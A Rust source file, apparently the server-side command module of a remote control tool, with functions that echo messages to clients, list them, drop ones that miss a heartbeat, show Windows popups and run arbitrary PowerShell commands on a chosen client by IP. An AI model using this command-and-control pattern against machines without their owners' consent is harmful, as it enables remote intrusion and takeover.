use std::sync::{Arc, Mutex};
use lib::{Command, CommandErr, send_data};
use crate::{ClientHandle, HandleVec};
use lib::CommandErr::*;




/// Echoes a message to a given client
pub fn echo(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
    if args.len() <= 2 {
        return Err(ArgNumErr("Incorrect number of arguments. Usage: echo [IP] [MESSAGE]"))
    }

    let ip = args[1].to_string();
    let message = args[2..].join(" ");

    for handle in handles.lock().unwrap().iter() {
        if handle.ip == ip {
            return if let Some(buf) = handle.send_to_client(Command::Echo, message.clone()) {
                let response: String = serde_json::from_slice(&buf)?;
                Ok(format!("Successfully echoed message {} to client with IP {}. Response: {}", message, ip, response))
            } else {
                Err(SendMessageErr(format!("An error occurred while sending message {} to client with IP {}", message, ip), ip))
            }
        }
    }
    Err(NoClientsErr("No clients exist"))
}

/// Echoes a message to all clients
pub fn echoall(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
    if args.len() == 1 {
        return Err(ArgNumErr("Incorrect number of arguments. Usage: echoall [MESSAGE]"))
    }
    
    let mut echo_attempt = false;

    let message = args[1..].join(" ");

    let mut error_vec: Vec<CommandErr> = Vec::new();
    
    for handle in handles.lock().unwrap().iter() {
        if let Some(buf) = handle.send_to_client(Command::Echo, message.clone()) {
            let response: String = serde_json::from_slice(&buf)?;
            log::info!("Successfully echoed message {} to client with IP {}. Response: {}", message, handle.ip, response);
            echo_attempt = true;
        } else {
            error_vec.push(SendMessageErr(format!("An error occurred while sending message {} to client with IP {}", message, handle.ip), handle.ip.clone()));
            echo_attempt = true;
        }
    }

    // Check if any clients exist
    if !echo_attempt {
        return Err(NoClientsErr("No clients exist"));
    }
    
    match error_vec.len() {
        0 => Ok(format!("Successfully sent message {} to all clients", message)),
        1 => Err(error_vec[0].clone()),
        _ => Err(MultipleErr(error_vec)),
    }
    
}

/// Runs a Powershell command on a given client
pub fn run(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
    if args.len() <= 2 {
        return Err(ArgNumErr("Incorrect number of arguments. Usage: run [IP] [COMMAND]"))
    }
    let ip = args[1].to_string();

    // Join every argument past the IP into a single command to run
    let command = args[2..].join(" ");

    log::trace!("Sending command: {}", command);
    for handle in handles.lock().unwrap().iter() {
        if handle.ip == ip {
            return if let Some(buf) = handle.send_to_client(Command::Run, command.clone()) {
                let response: String = serde_json::from_slice(&buf)?;
                Ok(format!("Successfully sent command {} to client with IP {}. Response: {}", command, handle.ip, response))
            } else {
                Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", command, handle.ip), ip))
            }
        }
    }
    Err(NoClientsErr("No clients exist"))
}

/// Makes a Windows popup message appear on a client's computer
pub fn popup(args: Vec<&str>, handles: &HandleVec) -> Result<String, CommandErr> {
    if args.len() <= 2 {
        return Err(ArgNumErr("Incorrect number of arguments. Usage: popup [IP] [MESSAGE]"))
    }

    let ip = args[1].to_string();
    let message = args[2..].join(" ");

    for handle in handles.lock().unwrap().iter() {
        if handle.ip == ip {
            return if handle.send_to_client(Command::Message, message.clone()).is_some() {
                Ok(format!("Successfully sent popup with message {} to client with IP {}.", message, handle.ip))
            } else {
                Err(SendMessageErr(format!("An error occurred while sending command {} to client with IP {}", message, handle.ip), ip))
            }
        }
    }
    Err(NoClientsErr("No clients exist"))
}

/// Lists every client IP
pub fn list(handles: &HandleVec) -> Result<String, CommandErr> {
    let mut client_vec = Vec::new();
    for handle in handles.lock().unwrap().iter() {
        client_vec.push(handle.ip.clone());
    }
    if client_vec.is_empty() {
        return Err(NoClientsErr("No clients exist"))
    }
    Ok(client_vec.join("\n"))
}

pub fn heartbeat(handles: &HandleVec) {
    let mut handle_vec = handles.lock().unwrap();
    for (n, handle) in handle_vec.clone().iter().enumerate() {
        if handle.send_to_client(Command::Send, String::from("thump")).is_none() {
            log::debug!("Client with IP {} has disconnected", handle.ip);
            handle_vec.remove(n);
        }
    }
}